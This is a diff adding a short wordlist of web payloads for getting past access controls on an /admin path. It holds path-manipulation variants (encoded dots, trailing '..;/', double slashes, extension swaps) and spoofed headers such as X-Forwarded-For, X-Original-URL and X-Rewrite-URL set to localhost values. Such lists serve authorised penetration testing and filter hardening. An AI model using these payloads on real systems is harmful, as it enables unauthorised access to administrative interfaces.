@@ -1,0 +1,21 @@
+/%2e/admin
+/admin/.
+/admin/..;/
+/admin/~
+/admin//
+/./admin/./
+/admin?anything
+/admin#anything
+/admin.json
+/admin.php
+/admin.html
+#X-payloads
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-Host: localhost
+X-Host: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
